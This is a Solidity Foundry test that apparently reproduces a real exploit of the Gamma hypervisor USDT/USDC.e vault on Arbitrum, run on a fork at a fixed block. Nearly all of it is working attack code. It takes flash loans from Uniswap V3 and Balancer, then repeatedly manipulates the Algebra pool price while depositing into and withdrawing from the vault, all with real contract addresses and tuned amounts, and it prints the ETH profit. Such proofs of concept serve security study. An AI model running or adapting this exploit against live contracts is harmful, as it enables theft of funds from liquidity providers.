// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.22;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "@interface/IWETH9.sol";
import "@interface/IUniswapV3.sol";
import "@interface/IBalancer.sol";

import "./IHypervisor.sol";
import "./IAlgebraPool.sol";
import "./IUniProxy.sol";

IUniProxy constant Uniproxy = IUniProxy(
    0x1F1Ca4e8236CD13032653391dB7e9544a6ad123E
);
IAlgebraPool constant AlgebraPool = IAlgebraPool(
    0x3AB5DD69950a948c55D1FBFb7500BF92B4Bd4C48
);
IHypervisor constant USDT_USDCe_pool = IHypervisor(
    0x61A7b3dae70D943C6f2eA9ba4FfD2fEcc6AF15E4
);
IUniswapV3Pool constant WETH_USDT_Pool = IUniswapV3Pool(
    0x641C00A822e8b671738d32a431a4Fb6074E5c79d
);
WETH9 constant WETH = WETH9(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
IBalancerVault constant balancer = IBalancerVault(
    0xBA12222222228d8Ba445958a75a0704d566BF2C8
);
IUniswapV3Pool constant WETH_USDCe_Pool = IUniswapV3Pool(
    0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443
);
IERC20 constant USDT = IERC20(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9);
IERC20 constant USDCe = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);

contract GammaTest is Test {
    function setUp() public {
        vm.createSelectFork("arbitrum", 166873291);
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        uint256 initial_balance = address(this).balance;
        USDT.approve(address(USDT_USDCe_pool), type(uint256).max);
        USDCe.approve(address(USDT_USDCe_pool), type(uint256).max);
        WETH_USDT_Pool.flash(address(this), 0, 3000000000000, "");

        WETH_USDCe_Pool.swap(
            address(this),
            false,
            int256(USDCe.balanceOf(address(this))),
            4526582309038291990822582, // the price limit of the swap
            ""
        );

        // received weth and withdraw
        WETH.withdraw(WETH.balanceOf(address(this)));

        print("Earned ETH", (address(this).balance - initial_balance), 18);
    }

    function calculatePrice() internal view returns (uint160) {
        (uint160 price, , , , , , , ) = AlgebraPool.globalState();
        return (price * 85572) / 100000;
    }

    function uniswapV3FlashCallback(
        uint256 v1,
        uint256 v2,
        bytes memory
    ) public {
        v1;
        v2;
        address[] memory arr01 = new address[](1);
        arr01[0] = address(USDCe);
        uint256[] memory arr02 = new uint256[](1);
        arr02[0] = 2000000000000;
        balancer.flashLoan(address(this), arr01, arr02, "x");
        // uint256 v2 = USDT.balanceOf(address(this)) - 3001500000000;
        AlgebraPool.swap(
            address(this),
            true,
            473259664738,
            calculatePrice(),
            ""
        );

        // repay flash loan
        USDT.transfer(address(WETH_USDT_Pool), 3001500000000);
    }

    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes memory
    ) public {
        amount0Delta;
        USDCe.transfer(address(WETH_USDCe_Pool), uint256(amount1Delta));
    }

    function algebraSwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes memory
    ) public {
        if (amount0Delta > 0) {
            USDT.transfer(address(AlgebraPool), uint256(amount0Delta));
        } else {
            USDCe.transfer(address(AlgebraPool), uint256(amount1Delta));
        }
    }

    function receiveFlashLoan(
        address[] memory,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) public {
        feeAmounts;
        uint256[4] memory empty_arr;
        empty_arr[0] = 0;
        empty_arr[1] = 0;
        empty_arr[2] = 0;
        empty_arr[3] = 0;

        for (uint256 i = 0; i < 15; i++) {
            AlgebraPool.swap(
                address(this),
                true,
                int256(USDT.balanceOf(address(this))),
                calculatePrice(),
                ""
            );

            uint256 val = Uniproxy.deposit(
                1,
                300000000000,
                address(this),
                address(USDT_USDCe_pool),
                empty_arr
            );

            USDT_USDCe_pool.withdraw(
                val,
                address(this),
                address(this),
                empty_arr
            );

            AlgebraPool.swap(
                address(this),
                false,
                int256(USDCe.balanceOf(address(this))),
                83949998135706271822084553181,
                ""
            );
            Uniproxy.deposit(
                1,
                1000000,
                address(this),
                address(USDT_USDCe_pool),
                empty_arr
            );
        }
        AlgebraPool.swap(
            address(this),
            true,
            -int256(amounts[0] - USDCe.balanceOf(address(this))),
            calculatePrice(),
            ""
        );

        USDCe.transfer(address(balancer), amounts[0]);
    }

    receive() external payable {}
}
